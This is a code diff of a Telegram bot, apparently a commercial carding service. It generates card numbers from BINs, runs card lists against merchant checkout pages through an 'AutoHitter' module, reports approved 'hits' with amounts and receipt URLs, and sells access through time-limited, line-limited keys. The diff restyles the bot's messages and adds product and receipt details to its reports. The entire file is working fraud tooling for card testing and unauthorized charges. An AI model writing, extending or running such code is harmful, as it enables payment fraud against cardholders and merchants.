-                f"⍟━━━⌁ <b>AutoHitter — BIN Mode</b> ⌁━━━⍟\n\n"
+                f"<b>⚡ AutoHitter — BIN Mode</b>\n\n"
                 f"Site: <code>{site_name}</code>\n"
-                f"BIN: <code>{bin_input}</code>\nGenerating 10 cards...")
+                f"BIN: <code>{bin_input}</code>\n"
+                f"Generating 10 cards...")
+
             gen_cards = generate_cards(bin_input, 10)
             if not gen_cards:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to generate cards.")
+                send_message(chat_id, f"<b>Failed to generate cards from BIN.</b>\n\n<i>{DEVELOPER}</i>")
                 return
             card_lines = gen_cards
 
         if not card_lines:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
-                "No cards found. Provide cards inline, reply to a message/file, or use a BIN.")
+                "<b>No cards found.</b>\n\n"
+                "Provide cards inline, reply to a card message/file,\n"
+                f"or use a BIN to auto-generate.\n\n<i>{DEVELOPER}</i>")
             return
 
+        # Single card — quick hit
         if len(card_lines) == 1:
             cc_line = card_lines[0]
             send_message(chat_id,
-                f"⍟━━━⌁ <b>AutoHitter</b> ⌁━━━⍟\n\n"
-                f"Site: <code>{site_name}</code>\nAnalyzing...")
+                f"<b>⚡ AutoHitter</b>\n\n"
+                f"Site: <code>{site_name}</code>\n"
+                f"Analyzing target...")
 
             def _single_hit():
                 try:
                     from dlx_autohitter import URLAnalyzer, hit_single, parse_card_line, detect_provider, SUPPORTED_PROVIDERS
                 except ImportError:
-                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAutoHitter module not available.")
+                    send_message(chat_id, f"<b>AutoHitter module not available.</b>\n\n<i>{DEVELOPER}</i>")
                     return
+
                 url_info = URLAnalyzer.analyze(target_url)
                 provider = url_info.get('provider', 'unknown')
                 merchant = url_info.get('merchant', site_name)
+
                 if provider not in SUPPORTED_PROVIDERS:
                     send_message(chat_id,
-                        f"⍟━━━⌁ <b>Unsupported Provider</b> ⌁━━━⍟\n\n"
-                        f"Detected: <code>{provider.upper()}</code>")
+                        f"<b>Unsupported Provider</b>\n\n"
+                        f"Site: <code>{site_name}</code>\n"
+                        f"Detected: <code>{provider.upper()}</code>\n\n"
+                        f"<i>{DEVELOPER}</i>")
                     return
+
                 card = parse_card_line(cc_line)
                 if not card:
-                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid card format.")
+                    send_message(chat_id, f"<b>Invalid card format.</b>\n\n<i>{DEVELOPER}</i>")
                     return
+
+                product = url_info.get('product', 'Unknown')
+                amount = url_info.get('amount')
+                currency = url_info.get('currency', 'USD')
+                product_url = url_info.get('product_url')
+
+                info_lines = [
+                    f"<b>⚡ Hitting...</b>\n",
+                    f"🏢 Site: <code>{merchant}</code>",
+                    f"🔌 Provider: <code>{provider.upper()}</code>",
+                ]
+                if product and product != 'Unknown':
+                    info_lines.append(f"📦 Product: <code>{product}</code>")
+                if amount:
+                    info_lines.append(f"💰 Amount: <code>{amount} {currency}</code>")
+                if product_url:
+                    info_lines.append(f"🔗 URL: <code>{product_url[:60]}</code>")
+                info_lines.append(f"💳 Card: <code>{cc_line}</code>")
+
+                send_message(chat_id, "\n".join(info_lines))
 
                 loop = asyncio.new_event_loop()
                 asyncio.set_event_loop(loop)
                 result = loop.run_until_complete(hit_single(target_url, card, 1))
                 loop.close()
 
+                receipt = result.get('receipt_url')
                 if result.get('success'):
-                    hit_msg = _fmt_hit_notification(user_id, username, f"AutoHitter ({provider})", cc_line,
-                                                    "Approved", f"{result.get('response_time', 0):.1f}s")
-                    send_message(chat_id, hit_msg)
+                    hit_lines = [
+                        "<b>✅ APPROVED — HIT!</b>\n",
+                        f"💳 Card: <code>{cc_line}</code>",
+                        f"🏢 Site: <code>{merchant}</code>",
+                        f"🔌 Provider: <code>{provider.upper()}</code>",
+                    ]
+                    if product and product != 'Unknown':
+                        hit_lines.append(f"📦 Product: <code>{product}</code>")
+                    if amount:
+                        hit_lines.append(f"💰 Amount: <code>{amount} {currency}</code>")
+                    hit_lines.append(f"⏱️ Time: <code>{result.get('response_time', 0):.1f}s</code>")
+                    if receipt:
+                        hit_lines.append(f"🔗 Receipt: <code>{receipt[:80]}</code>")
+                    hit_lines.append(f"\n<i>{DEVELOPER}</i>")
+                    send_message(chat_id, "\n".join(hit_lines))
                     notify_hit(user_id, username, f"AutoHitter ({provider})", cc_line, "Approved")
                 elif result.get('error'):
                     send_message(chat_id,
-                        f"⍟━━━⌁ <b>ERROR</b> ⌁━━━⍟\n\n"
-                        f"Card: <code>{cc_line}</code>\nError: <code>{result['error'][:80]}</code>")
+                        f"<b>⚠️ ERROR</b>\n\n"
+                        f"💳 Card: <code>{cc_line}</code>\n"
+                        f"🏢 Site: <code>{site_name}</code>\n"
+                        f"Error: <code>{result['error'][:80]}</code>\n\n"
+                        f"<i>{DEVELOPER}</i>")
                 else:
                     send_message(chat_id,
-                        f"⍟━━━⌁ <b>DECLINED</b> ⌁━━━⍟\n\n"
-                        f"Card: <code>{cc_line}</code>\nReason: <code>{result.get('decline_code', 'unknown')}</code>")
+                        f"<b>❌ DECLINED</b>\n\n"
+                        f"💳 Card: <code>{cc_line}</code>\n"
+                        f"🏢 Site: <code>{site_name}</code>\n"
+                        f"📉 Reason: <code>{result.get('decline_code', 'unknown')}</code>\n"
+                        f"⏱️ Time: <code>{result.get('response_time', 0):.1f}s</code>\n\n"
+                        f"<i>{DEVELOPER}</i>")
+
             threading.Thread(target=_single_hit, daemon=True).start()
             return
 
-        # Bulk autohitter
+        # Bulk mode — card_lines already populated above
         with active_lock:
             if user_id in active_users:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nYou already have a task running.")
+                send_message(chat_id, f"<b>You already have a task running.</b>\n\n<i>{DEVELOPER}</i>")
                 return
             active_users.add(user_id)
+
         cancel_flags.pop(user_id, None)
 
         user_limit = get_user_line_limit(user_id)
@@ -1889,21 +2014,27 @@ def handle_update(update):
             with active_lock:
                 active_users.discard(user_id)
             send_message(chat_id,
-                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
-                f"Your key allows <code>{user_limit}</code> lines. Provided: <code>{len(card_lines)}</code>.")
+                f"<b>Too Many Cards</b>\n\n"
+                f"Your key allows <code>{user_limit}</code> lines.\n"
+                f"Provided: <code>{len(card_lines)}</code> cards.\n\n"
+                f"<i>{DEVELOPER}</i>")
             return
 
-        init_resp = send_message(chat_id,
-            f"⍟━━━⌁ <b>AutoHitter Starting</b> ⌁━━━⍟\n\n"
-            f"Site: <code>{site_name}</code>\nCards: <code>{len(card_lines)}</code>",
-            reply_markup=stop_button_markup(user_id))
+        bin_label = " (BIN gen)" if is_bin_mode else ""
+        init_resp = send_message(
+            chat_id,
+            f"<b>⚡ AutoHitter Starting{bin_label}</b>\n\n"
+            f"Site: <code>{site_name}</code>\n"
+            f"Cards: <code>{len(card_lines)}</code>",
+            reply_markup=stop_button_markup(user_id)
+        )
         progress_msg_id = init_resp.get("result", {}).get("message_id")
 
         def _run_autohitter():
             try:
-                from dlx_autohitter import URLAnalyzer, hit_single, parse_card_line as ah_parse_card, SUPPORTED_PROVIDERS, SmartRateLimiter
+                from dlx_autohitter import URLAnalyzer, hit_single, parse_card_line as ah_parse_card, detect_provider, SUPPORTED_PROVIDERS, SmartRateLimiter
             except ImportError:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAutoHitter module not available.")
+                send_message(chat_id, f"<b>AutoHitter module not available.</b>\n\n<i>{DEVELOPER}</i>")
                 with active_lock:
                     active_users.discard(user_id)
                 return
@@ -1911,21 +2042,43 @@ def handle_update(update):
             url_info = URLAnalyzer.analyze(target_url)
             provider = url_info.get('provider', 'unknown')
             merchant = url_info.get('merchant', site_name)
+            ah_product = url_info.get('product', 'Unknown')
+            ah_amount = url_info.get('amount')
+            ah_currency = url_info.get('currency', 'USD')
+            ah_product_url = url_info.get('product_url')
 
             if provider not in SUPPORTED_PROVIDERS:
                 send_message(chat_id,
-                    f"⍟━━━⌁ <b>Unsupported Provider</b> ⌁━━━⍟\n\nDetected: <code>{provider.upper()}</code>")
+                    f"<b>Unsupported Provider</b>\n\n"
+                    f"🏢 Site: <code>{site_name}</code>\n"
+                    f"🔌 Detected: <code>{provider.upper()}</code>\n\n"
+                    f"<i>{DEVELOPER}</i>")
                 with active_lock:
                     active_users.discard(user_id)
                 return
+
+            # Build info header
+            info_header = f"🏢 Site: <code>{merchant}</code>\n🔌 Provider: <code>{provider.upper()}</code>"
+            if ah_product and ah_product != 'Unknown':
+                info_header += f"\n📦 Product: <code>{ah_product}</code>"
+            if ah_amount:
+                info_header += f"\n💰 Amount: <code>{ah_amount} {ah_currency}</code>"
+
+            if progress_msg_id:
+                edit_message(chat_id, progress_msg_id,
+                    f"<b>⚡ AutoHitter Active</b>\n\n"
+                    f"{info_header}\n"
+                    f"🎴 Cards: <code>{len(card_lines)}</code>\n\n"
+                    f"⏳ Processing...",
+                    reply_markup=stop_button_markup(user_id))
 
             rate_limiter = SmartRateLimiter()
             total = len(card_lines)
             successes = 0
             fails = 0
             approved_list = []
-            start_time = time.time()
             last_edit = [0]
+            start_time = time.time()
 
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
@@ -1933,20 +2086,36 @@ def handle_update(update):
             for i, line in enumerate(card_lines):
                 if cancel_flags.get(user_id):
                     break
+
                 card = ah_parse_card(line)
                 if not card:
                     fails += 1
                     continue
+
                 if i > 0:
                     delay = rate_limiter.calculate_delay('declined' if fails > successes else 'success')
                     time.sleep(delay)
+
                 result = loop.run_until_complete(hit_single(target_url, card, i + 1))
+
                 if result.get('success'):
                     successes += 1
                     approved_list.append(line)
-                    hit_msg = _fmt_hit_notification(user_id, username, f"AutoHitter ({provider})", line,
-                                                    "Approved", f"{result.get('response_time', 0):.1f}s")
-                    send_message(chat_id, hit_msg)
+                    hit_lines = [
+                        f"<b>✅ HIT — APPROVED!</b>\n",
+                        f"💳 <code>{line}</code>",
+                        f"🏢 Site: <code>{merchant}</code>",
+                    ]
+                    if ah_product and ah_product != 'Unknown':
+                        hit_lines.append(f"📦 Product: <code>{ah_product}</code>")
+                    if ah_amount:
+                        hit_lines.append(f"💰 Amount: <code>{ah_amount} {ah_currency}</code>")
+                    receipt = result.get('receipt_url')
+                    if receipt:
+                        hit_lines.append(f"🔗 Receipt: <code>{receipt[:80]}</code>")
+                    hit_lines.append(f"⏱️ Time: <code>{result.get('response_time', 0):.1f}s</code>")
+                    hit_lines.append(f"[{i+1}/{total}]\n\n<i>{DEVELOPER}</i>")
+                    send_message(chat_id, "\n".join(hit_lines))
                     notify_hit(user_id, username, f"AutoHitter ({provider})", line, "Approved")
                 else:
                     fails += 1
@@ -1960,25 +2129,35 @@ def handle_update(update):
                     bar_len = 16
                     filled = int(bar_len * (i + 1) / total)
                     bar = "█" * filled + "░" * (bar_len - filled)
+
                     markup = None if (i + 1 == total) else stop_button_markup(user_id)
                     edit_message(chat_id, progress_msg_id,
-                        f"⍟━━━⌁ <b>AutoHitter {'✅ Complete' if i+1==total else 'Active'}</b> ⌁━━━⍟\n\n"
-                        f"Site: <code>{merchant}</code>\n"
+                        f"<b>⚡ AutoHitter {'✅ Complete' if i+1==total else 'Active'}</b>\n\n"
+                        f"{info_header}\n\n"
                         f"<code>{bar}</code> {pct}%\n\n"
-                        f"Progress: <code>{i+1}/{total}</code>\n"
-                        f"Speed: <code>{cpm} CPM</code>\n\n"
+                        f"📊 Progress: <code>{i+1}/{total}</code>\n"
+                        f"⚡ Speed: <code>{cpm} CPM</code>\n\n"
                         f"✅ Approved: <code>{successes}</code>\n"
-                        f"❌ Failed: <code>{fails}</code>",
+                        f"❌ Failed: <code>{fails}</code>\n\n"
+                        f"<i>{DEVELOPER}</i>",
                         reply_markup=markup)
 
             loop.close()
             cancel_flags.pop(user_id, None)
 
-            send_message(chat_id,
-                f"⍟━━━⌁ <b>AutoHitter Complete</b> ⌁━━━⍟\n\n"
-                f"Total: <code>{total}</code>\n"
-                f"✅ Approved: <code>{successes}</code>\n"
-                f"❌ Failed: <code>{fails}</code>")
+            elapsed_total = time.time() - start_time
+            success_rate = int(successes / total * 100) if total > 0 else 0
+            final_lines = [
+                "<b>⚡ AutoHitter — Complete</b>\n",
+                f"{info_header}\n",
+                f"📊 Total: <code>{total}</code>",
+                f"✅ Approved: <code>{successes}</code>",
+                f"❌ Failed: <code>{fails}</code>",
+                f"📈 Success Rate: <code>{success_rate}%</code>",
+                f"⏱️ Total Time: <code>{elapsed_total:.1f}s</code>",
+                f"\n<i>{DEVELOPER}</i>",
+            ]
+            send_message(chat_id, "\n".join(final_lines))
 
             if approved_list:
                 filename = f"autohitter_hits_{int(time.time())}.txt"
@@ -1991,7 +2170,8 @@ def handle_update(update):
             with active_lock:
                 active_users.discard(user_id)
 
-        threading.Thread(target=_run_autohitter, daemon=True).start()
+        t = threading.Thread(target=_run_autohitter, daemon=True)
+        t.start()
         return
 
     # --- /filesend ---
@@ -1999,71 +2179,96 @@ def handle_update(update):
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
             return
+
         reply = msg.get("reply_to_message")
         doc = None
+
+        # Check if the message itself has a document (attach + command)
         if msg.get("document"):
             doc = msg["document"]
+        # Check reply for document
         elif reply and reply.get("document"):
             doc = reply["document"]
+
         if not doc:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>File Send</b> ⌁━━━⍟\n\n"
-                "Attach a file with <code>/filesend</code> or reply to a file.")
+                "<b>📁 File Send</b>\n\n"
+                "<b>Usage:</b>\n"
+                "1️⃣ Attach a file and type <code>/filesend</code> in caption\n"
+                "2️⃣ Reply to any file with <code>/filesend</code>\n\n"
+                f"File will be saved to the server.\n\n<i>{DEVELOPER}</i>")
             return
+
         file_name = doc.get("file_name", f"file_{int(time.time())}")
         file_size = doc.get("file_size", 0)
         file_id = doc.get("file_id")
+
         if not file_id:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nCould not get file ID.")
+            send_message(chat_id, f"<b>Could not get file ID.</b>\n\n<i>{DEVELOPER}</i>")
             return
-        send_message(chat_id, f"Downloading <code>{file_name}</code>...")
+
+        send_message(chat_id,
+            f"<b>📁 Downloading...</b>\n\n"
+            f"File: <code>{file_name}</code>\n"
+            f"Size: <code>{file_size / 1024:.1f} KB</code>")
 
         def _save_file():
             try:
                 content = download_file(file_id, binary=True)
                 if not content:
-                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to download.")
+                    send_message(chat_id, f"<b>Failed to download file.</b>\n\n<i>{DEVELOPER}</i>")
                     return
+
                 filesent_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "filesent")
                 os.makedirs(filesent_dir, exist_ok=True)
+
                 save_path = os.path.join(filesent_dir, file_name)
+
+                # If file exists, add timestamp
                 if os.path.exists(save_path):
                     name, ext = os.path.splitext(file_name)
                     save_path = os.path.join(filesent_dir, f"{name}_{int(time.time())}{ext}")
+
                 if isinstance(content, str):
                     with open(save_path, "w", encoding="utf-8") as f:
                         f.write(content)
                 else:
                     with open(save_path, "wb") as f:
                         f.write(content)
+
+                actual_name = os.path.basename(save_path)
                 send_message(chat_id,
-                    f"⍟━━━⌁ <b>File Saved</b> ⌁━━━⍟\n\n"
-                    f"Name: <code>{os.path.basename(save_path)}</code>\n"
-                    f"Size: <code>{file_size / 1024:.1f} KB</code>")
+                    f"<b>✅ File Saved</b>\n\n"
+                    f"📄 Name: <code>{actual_name}</code>\n"
+                    f"📂 Location: <code>filesent/</code>\n"
+                    f"💾 Size: <code>{file_size / 1024:.1f} KB</code>\n\n"
+                    f"<i>{DEVELOPER}</i>")
             except Exception as e:
-                send_message(chat_id, f"⍟━━━⌁ <b>Error:</b> {str(e)[:80]} ⌁━━━⍟")
+                send_message(chat_id, f"<b>Error saving file:</b> <code>{str(e)[:80]}</code>\n\n<i>{DEVELOPER}</i>")
+
         threading.Thread(target=_save_file, daemon=True).start()
         return
 
     # --- /adminkey ---
     if text.startswith("/adminkey"):
         if int(user_id) not in ADMIN_IDS:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nOwner only.")
+            send_message(chat_id, f"<b>Owner only.</b>\n\n<i>{DEVELOPER}</i>")
             return
         parts = text.split()
         if len(parts) < 2:
             send_message(chat_id,
-                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/adminkey 123456789 7d</code>")
+                "<b>Usage:</b> <code>/adminkey 123456789 7d</code>\n"
+                f"Duration optional (default: permanent).\n\n<i>{DEVELOPER}</i>")
             return
         target_id = parts[1].strip()
         if not target_id.isdigit():
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid user ID.")
+            send_message(chat_id, f"<b>Invalid user ID.</b>\n\n<i>{DEVELOPER}</i>")
             return
         duration_seconds = None
         if len(parts) >= 3:
             parsed = parse_duration(parts[2])
             if parsed == -1:
-                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid duration.")
+                send_message(chat_id, f"<b>Invalid duration.</b>\nExamples: 7d, 1mo, perm\n\n<i>{DEVELOPER}</i>")
                 return
             duration_seconds = parsed
         admins = _load_json(ADMINS_FILE, {})
@@ -2076,14 +2281,16 @@ def handle_update(update):
         _save_json(ADMINS_FILE, admins)
         dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Admin Granted</b> ⌁━━━⍟\n\n"
-            f"User: <code>{target_id}</code>\nDuration: <code>{dur_label}</code>")
+            f"<b>Admin Granted</b>\n\n"
+            f"User: <code>{target_id}</code>\n"
+            f"Duration: <code>{dur_label}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
     # --- /adminlist ---
     if text == "/adminlist":
         if int(user_id) not in ADMIN_IDS:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nOwner only.")
+            send_message(chat_id, f"<b>Owner only.</b>\n\n<i>{DEVELOPER}</i>")
             return
         admins = _load_json(ADMINS_FILE, {})
         lines_out = []
@@ -2101,8 +2308,9 @@ def handle_update(update):
         for oid in ADMIN_IDS:
             lines_out.insert(0, f"  {oid}  ·  Owner (permanent)")
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Admins ({len(lines_out)})</b> ⌁━━━⍟\n\n"
-            "<code>" + "\n".join(lines_out) + "</code>")
+            f"<b>Admins ({len(lines_out)})</b>\n\n"
+            "<code>" + "\n".join(lines_out) + "</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
     # --- /chkapi* ---
@@ -2114,11 +2322,12 @@ def handle_update(update):
         gate_name = gate_info.get("name", gate_key)
         currently_enabled = is_gate_enabled(gate_key)
 
-        send_message(chat_id, f"Probing {gate_name}...")
+        send_message(chat_id, f"<b>Probing {gate_name}...</b>")
         alive, latency, detail = probe_gate(gate_key)
 
         if alive:
             status_line = f"<b>ALIVE</b> — {latency}ms"
+            action_text = "Gate is working. Want to disable it?"
             buttons = {"inline_keyboard": [[
                 {"text": "Disable", "callback_data": f"gate_off_{gate_key}"},
                 {"text": "Keep", "callback_data": "gate_keep"},
@@ -2126,11 +2335,13 @@ def handle_update(update):
         else:
             status_line = f"<b>DEAD</b> — {detail}"
             if currently_enabled:
+                action_text = "API is down. Disable this gate?"
                 buttons = {"inline_keyboard": [[
-                    {"text": "Disable", "callback_data": f"gate_off_{gate_key}"},
-                    {"text": "Keep", "callback_data": "gate_keep"},
+                    {"text": "Yes, disable", "callback_data": f"gate_off_{gate_key}"},
+                    {"text": "Keep enabled", "callback_data": "gate_keep"},
                 ]]}
             else:
+                action_text = "Gate is disabled. Re-enable?"
                 buttons = {"inline_keyboard": [[
                     {"text": "Re-enable", "callback_data": f"gate_on_{gate_key}"},
                     {"text": "Keep off", "callback_data": "gate_keep"},
@@ -2138,11 +2349,13 @@ def handle_update(update):
 
         enabled_label = "Enabled" if currently_enabled else "Disabled"
         send_message(chat_id,
-            f"⍟━━━⌁ <b>API Check — {gate_name}</b> ⌁━━━⍟\n\n"
+            f"<b>API Check — {gate_name}</b>\n\n"
             f"Status: {status_line}\n"
             f"Detail: <code>{detail}</code>\n"
             f"Latency: <code>{latency}ms</code>\n"
-            f"Currently: {enabled_label}",
+            f"Currently: {enabled_label}\n\n"
+            f"{action_text}\n\n"
+            f"<i>{DEVELOPER}</i>",
             reply_markup=buttons)
         return
 
@@ -2150,8 +2363,8 @@ def handle_update(update):
     if text == "/chkapis":
         if not is_admin(user_id):
             return
-        send_message(chat_id, "Checking all gates...")
-        lines_out = [f"⍟━━━⌁ <b>API Health Report</b> ⌁━━━⍟\n"]
+        send_message(chat_id, "<b>Checking all gates...</b>")
+        lines_out = ["<b>API Health Report</b>\n"]
         any_dead = []
         for gate_key, info in GATE_PROBE_MAP.items():
             alive, latency, detail = probe_gate(gate_key)
@@ -2163,39 +2376,36 @@ def handle_update(update):
                 any_dead.append(gate_key)
             en_text = "On" if enabled else "Off"
             lines_out.append(
-                f"<code>{info['cmd']}</code> — {info['name']}\n    {status}  ·  {en_text}")
+                f"<code>{info['cmd']}</code> — {info['name']}\n"
+                f"    {status}  ·  {en_text}")
         if any_dead:
             lines_out.append(f"\n<b>{len(any_dead)} dead gate(s)</b>")
         else:
             lines_out.append(f"\n<b>All gates operational</b>")
+        lines_out.append(f"\n<i>{DEVELOPER}</i>")
         send_message(chat_id, "\n".join(lines_out))
         return
 
     # --- /gates ---
     if text == "/gates":
         gs = load_gate_stats()
-        lines_out = [f"⍟━━━⌁ <b>Auth Gates</b> ⌁━━━⍟\n"]
-        for key, cmd, label, live in AUTH_GATES:
+        lines_out = ["<b>Available Gates</b>\n"]
+        for key, cmd, label, live in GATE_REGISTRY:
             enabled = is_gate_enabled(key)
-            status_text = "Live" if (live and enabled) else ("Disabled" if not enabled else "Soon")
+            if not live:
+                status_text = "Soon"
+            elif not enabled:
+                status_text = "Disabled"
+            else:
+                status_text = "Live"
             s = gs.get(key, {})
             total = s.get("total", 0)
             approved = s.get("approved", 0)
             rate = round((approved / total) * 100, 1) if total > 0 else 0
             lines_out.append(
-                f"<code>{cmd}</code>  ·  {label}\n    {status_text}  ·  {total} checked  ·  {approved} hits  ·  {rate}%")
-
-        lines_out.append(f"\n⍟━━━⌁ <b>Charge Gates</b> ⌁━━━⍟\n")
-        for key, cmd, label, live in CHARGE_GATES:
-            enabled = is_gate_enabled(key)
-            status_text = "Live" if (live and enabled) else ("Disabled" if not enabled else "Soon")
-            s = gs.get(key, {})
-            total = s.get("total", 0)
-            approved = s.get("approved", 0)
-            rate = round((approved / total) * 100, 1) if total > 0 else 0
-            lines_out.append(
-                f"<code>{cmd}</code>  ·  {label}\n    {status_text}  ·  {total} checked  ·  {approved} hits  ·  {rate}%")
-
+                f"<code>{cmd}</code>  ·  {label}\n"
+                f"    {status_text}  ·  {total} checked  ·  {approved} hits  ·  {rate}%")
+        lines_out.append(f"\n<i>{DEVELOPER}</i>")
         send_message(chat_id, "\n".join(lines_out))
         return
 
@@ -2212,7 +2422,7 @@ def handle_update(update):
     # --- /genkey ---
     if text.startswith("/genkey") and not text.startswith("/genkeys"):
         if not is_admin(user_id):
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
+            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
             return
         parts = text.split()
         line_limit = None
@@ -2223,46 +2433,55 @@ def handle_update(update):
                 if len(parts) >= 3:
                     parsed = parse_duration(parts[2])
                     if parsed == -1:
-                        send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid duration.")
+                        send_message(chat_id, f"<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm\n\n<i>{DEVELOPER}</i>")
                         return
                     duration_seconds = parsed
             except ValueError:
                 parsed = parse_duration(parts[1])
                 if parsed == -1:
-                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/genkey [limit] [duration]</code>")
+                    send_message(chat_id,
+                        f"<b>Usage:</b> <code>/genkey [limit] [duration]</code>\n"
+                        f"Examples: /genkey 500 7d, /genkey 7d, /genkey\n\n<i>{DEVELOPER}</i>")
                     return
                 duration_seconds = parsed
         key = generate_key()
         keys = load_keys()
         keys[key] = {
-            "created_by": user_id, "created_at": time.time(),
-            "used": False, "duration": duration_seconds, "line_limit": line_limit,
+            "created_by": user_id,
+            "created_at": time.time(),
+            "used": False,
+            "duration": duration_seconds,
+            "line_limit": line_limit,
         }
         save_keys(keys)
         dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
         limit_label = str(line_limit) if line_limit else "Unlimited"
         send_message(chat_id,
-            f"⍟━━━⌁ <b>Key Generated</b> ⌁━━━⍟\n\n"
+            f"<b>Key Generated</b>\n\n"
             f"<code>{key}</code>\n"
-            f"Duration: <code>{dur_label}</code>\nLimit: <code>{limit_label}</code>")
+            f"Duration: <code>{dur_label}</code>\n"
+            f"Line Limit: <code>{limit_label}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
         return
 
     # --- /genkeys ---
     if text.startswith("/genkeys"):
         if not is_admin(user_id):
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
+            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
             return
         parts = text.split()
         if len(parts) < 2:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/genkeys 10 500 7d</code>")
+            send_message(chat_id,
+                f"<b>Usage:</b> <code>/genkeys 10 500 7d</code>\n\n"
+                f"count · limit · duration\n\n<i>{DEVELOPER}</i>")
             return
         try:
             count = int(parts[1])
         except ValueError:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid count.")
+            send_message(chat_id, f"<b>Invalid count.</b>\n\n<i>{DEVELOPER}</i>")
             return
         if count < 1 or count > 500:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nCount must be 1-500.")
+            send_message(chat_id, f"<b>Count must be 1-500.</b>\n\n<i>{DEVELOPER}</i>")
             return
         line_limit = None
         duration_seconds = None
@@ -2272,13 +2491,13 @@ def handle_update(update):
                 if len(parts) >= 4:
                     parsed = parse_duration(parts[3])
                     if parsed == -1:
-                        send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid duration.")
+                        send_message(chat_id, f"<b>Invalid duration.</b>\n\n<i>{DEVELOPER}</i>")
                         return
                     duration_seconds = parsed
             except ValueError:
                 parsed = parse_duration(parts[2])
                 if parsed == -1:
-                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid format.")
+                    send_message(chat_id, f"<b>Invalid format.</b>\n\n<i>{DEVELOPER}</i>")
                     return
                 duration_seconds = parsed
         keys = load_keys()
@@ -2286,8 +2505,11 @@ def handle_update(update):
         for _ in range(count):
             key = generate_key()
             keys[key] = {
-                "created_by": user_id, "created_at": time.time(),
-                "used": False, "duration": duration_seconds, "line_limit": line_limit,
+                "created_by": user_id,
+                "created_at": time.time(),
+                "used": False,
+                "duration": duration_seconds,
+                "line_limit": line_limit,
             }
             generated.append(key)
         save_keys(keys)
@@ -2299,37 +2521,39 @@ def handle_update(update):
             for k in generated:
                 f.write(k + "\n")
         send_document(chat_id, filepath, filename,
-            caption=f"⍟━━━⌁ <b>{count} Keys Generated</b> ⌁━━━⍟\n"
-                    f"Duration: <code>{dur_label}</code>\nLimit: <code>{limit_label}</code>")
+            caption=f"<b>{count} Keys Generated</b>\n"
+                    f"Duration: <code>{dur_label}</code>\n"
+                    f"Line Limit: <code>{limit_label}</code>\n\n"
+                    f"<i>{DEVELOPER}</i>")
         return
 
     # --- /revoke ---
     if text.startswith("/revoke"):
         if not is_admin(user_id):
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAdmin only.")
+            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
             return
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/revoke 123456789</code>")
+            send_message(chat_id, f"<b>Usage:</b> <code>/revoke 123456789</code>\n\n<i>{DEVELOPER}</i>")
             return
         target_id = parts[1].strip()
         users = load_users()
         if target_id in users:
             del users[target_id]
             save_users(users)
-            send_message(chat_id, f"⍟━━━⌁ <b>Access Revoked</b> ⌁━━━⍟\n\nUser <code>{target_id}</code> removed.")
+            send_message(chat_id, f"<b>Access Revoked</b>\n\nUser <code>{target_id}</code> removed.\n\n<i>{DEVELOPER}</i>")
         else:
-            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nUser not found.")
